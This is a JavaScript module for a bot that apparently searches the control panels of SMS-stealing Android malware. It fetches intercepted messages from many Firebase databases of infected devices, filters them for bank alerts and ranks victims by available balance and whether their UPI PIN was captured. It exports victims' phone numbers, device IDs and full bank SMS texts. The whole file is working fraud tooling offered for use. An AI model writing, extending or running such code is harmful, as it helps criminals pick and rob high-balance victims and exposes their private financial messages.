import { fetchAllPanels, normalizeFirebaseUrl } from './panelCore.mjs';
import { processBankMessages } from './bankSms.mjs';

const TIERS = {
  low_high: { min: 2000, max: 50_000, label: 'BAL LOW->HIGH', sort: 'asc' },
  high_low: { min: 50_000, max: 9_000_000, label: 'BAL HIGH->LOW', sort: 'desc' },
  bank70k: { min: 70_000, max: 10_000_000, label: 'Bank 70K–1Cr', sort: 'desc' },
  user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
};

const SMS_LIMIT = { 1: 700, 3: 1000, 7: 1400, 15: 2000, 30: 2500, 0: 3000 };

export function parseSearchCommand(text) {
  const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
  const isBankHigh = /^\/searchbank/i.test(text);
  const parts = raw.split(/[,|]/).map(s => s.trim().toLowerCase()).filter(Boolean);

  const opts = {
    keywords: [],
    online: true,
    offline: false,
    bothStatus: false,
    pinBoth: true,
    pinOnly: false,
    noPinOnly: false,
    days: 1,
    tier: isBankHigh ? 'bank70k' : 'low_high',
    bankOnly: true,
    avlBal: false,
  };

  for (const p of parts) {
    if (p === 'online') {
      opts.online = true;
      opts.offline = false;
      opts.bothStatus = false;
    } else if (p === 'offline') {
      opts.offline = true;
      opts.online = false;
      opts.bothStatus = false;
    } else if (p === 'both') {
      opts.bothStatus = true;
      opts.online = false;
      opts.offline = false;
    } else if (/^\d+\s*d(ays?)?$/.test(p) || /^last\s*\d+/.test(p)) {
      opts.days = parseInt(p.match(/\d+/)?.[0] || '1', 10);
    } else if (p === 'high' || p === 'high-low') opts.tier = 'high_low';
    else if (p === 'low' || p === 'low-high') opts.tier = 'low_high';
    else if (p === '30k' || p === '30-90l') opts.tier = 'user30_90L';
    else if (/avl|bal/.test(p)) opts.avlBal = true;
    else if (p === 'bank' || p === 'bank online') opts.bankOnly = true;
    else opts.keywords.push(p);
  }

  return opts;
}

function devicePassesStatus(d, opts) {
  if (opts.bothStatus) return true;
  if (opts.online && !opts.offline) return d.status;
  if (opts.offline && !opts.online) return !d.status;
  return true;
}

function devicePassesPin(d, opts) {
  if (opts.pinBoth) return true;
  if (opts.pinOnly) return d.hasPin;
  if (opts.noPinOnly) return !d.hasPin;
  return true;
}

async function fetchDeviceMessages(device, limit = 800) {
  const base = normalizeFirebaseUrl(device.panelUrl);
  const params = new URLSearchParams({
    orderBy: '"$key"',
    limitToLast: String(limit),
  });
  if (device.panelKey?.trim()) params.set('auth', device.panelKey.trim());
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 9000);
  try {
    const res = await fetch(`${base}/messages/${encodeURIComponent(device.id)}.json?${params}`, {
      signal: ctrl.signal,
      headers: { Accept: 'application/json' },
    });
    clearTimeout(timer);
    if (!res.ok) return null;
    const data = await res.json();
    if (data?.error) return null;
    return data;
  } catch {
    clearTimeout(timer);
    return null;
  }
}

function smsLimitForDays(days) {
  if (days <= 1) return SMS_LIMIT[1];
  if (days <= 3) return SMS_LIMIT[3];
  if (days <= 7) return SMS_LIMIT[7];
  if (days <= 15) return SMS_LIMIT[15];
  if (days <= 30) return SMS_LIMIT[30];
  return SMS_LIMIT[0];
}

export function buildSearchHeader(opts, tier) {
  const pinPart = opts.pinBoth ? 'PIN: WITH + WITHOUT PIN' : 'PIN: FILTERED';
  const statPart = opts.bothStatus
    ? 'ONLINE + OFFLINE'
    : opts.online
      ? 'ONLINE DEVICES ONLY'
      : 'OFFLINE DEVICES ONLY';
  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- LAST ${opts.days} DAY(S)`;
}

export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, elapsedMs) {
  const smsTotal = results.reduce((s, r) => s + (r.bankSms?.length || 0), 0);
  const gen = new Date().toLocaleString('en-IN', { hour12: false }).replace(',', '');
  const lines = [
    buildSearchHeader(opts, tier),
    `Generated: ${gen}`,
    `Search time: ${(elapsedMs / 1000).toFixed(0)}s`,
    `Stats: Total Matches: ${smsTotal} | Devices: ${results.length} | DBs done: ${dbPanelsHit}/${panelsTotal}`,
    '',
  ];

  results.forEach((d, i) => {
    const smsList = d.bankSms || [];
    lines.push(`----------------+#[${i + 1}]-----------------`);
    lines.push(`Firebase: ${normalizeFirebaseUrl(d.panelUrl)}`);
    lines.push(`Device ID: ${d.id}`);
    lines.push(`Phone: ${d.phone || '—'}`);
    lines.push(`UPI PIN: ${d.hasPin ? 'YES' : 'NO'}`);
    if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | SMS Count: ${smsList.length}`);
    lines.push(`Panel: ${d.panelName || '—'}`);
  lines.push('');
    smsList.forEach(m => {
      lines.push('---------------------------------------------------');
      lines.push(`[${m.sender}]`);
      lines.push(m.text);
    });
    lines.push('');
  });
  return lines.join('\n');
}

export async function runSearch(panels, opts, onProgress) {
  const tier = TIERS[opts.tier] || TIERS.low_high;
  const t0 = Date.now();
  const panelsHit = new Set();

  let devices = await fetchAllPanels(panels, {
    batch: 35,
    onProgress: (done, total, count) => {
      onProgress?.({ phase: 'panels', done, total, count });
    },
  });

  devices.forEach(d => panelsHit.add(d.panelUrl?.toLowerCase()));

  devices = devices.filter(d => devicePassesStatus(d, opts) && devicePassesPin(d, opts));
  const results = [];
  const batch = 28;
  const limit = smsLimitForDays(opts.days);
  let scanned = 0;

  for (let i = 0; i < devices.length; i += batch) {
    const chunk = devices.slice(i, i + batch);
    await Promise.all(
      chunk.map(async d => {
        try {
          const data = await fetchDeviceMessages(d, limit);
          const r = processBankMessages(data, opts.days);
          if (!r.bankSmsCount) return;
          if (opts.avlBal && !r.maxBalance && !r.bankSms.some(m => /avl\s*bal/i.test(m.text))) return;
          const row = { ...d, bankSms: r.bankSms, maxBalance: r.maxBalance, maxTxn: r.maxTxn };
          const amt = row.maxBalance || row.maxTxn || 0;
          if (opts.tier !== 'low_high' && amt > 0 && (amt < tier.min || amt > tier.max)) return;
          results.push(row);
        } catch (_) {}
      })
    );
    scanned += chunk.length;
    onProgress?.({ phase: 'sms', done: scanned, total: devices.length, matched: results.length });
  }

  const filtered = results.filter(r => (r.bankSms?.length || 0) > 0);
  filtered.sort((a, b) => {
    const aa = a.maxBalance || a.maxTxn || 0;
    const ab = b.maxBalance || b.maxTxn || 0;
    return tier.sort === 'asc' ? aa - ab : ab - aa;
  });

  const elapsed = Date.now() - t0;
  const text = buildExportText(filtered, opts, tier, panels.length, panelsHit.size, elapsed);
  const sms = filtered.reduce((s, r) => s + r.bankSms.length, 0);
  return {
    results: filtered,
    text,
    stats: { devices: filtered.length, sms, panelsHit: panelsHit.size },
    elapsed,
    tier,
    opts,
  };
}

export function searchHelpText() {
  return (
    '🔎 *Search Commands*\n\n' +
    'Quick:\n' +
    '`/search avl/bal, bank online`\n\n' +
    '🏦 High balance:\n' +
    '`/searchbank` ya `30-90L, high`\n\n' +
    '📩 File + caption `addtxt` ya `/fb`\n\n' +
    '• spam SMS auto remove\n' +
    '• TXT mein full Firebase + Device ID\n' +
    '/done = cancel'
  );
}
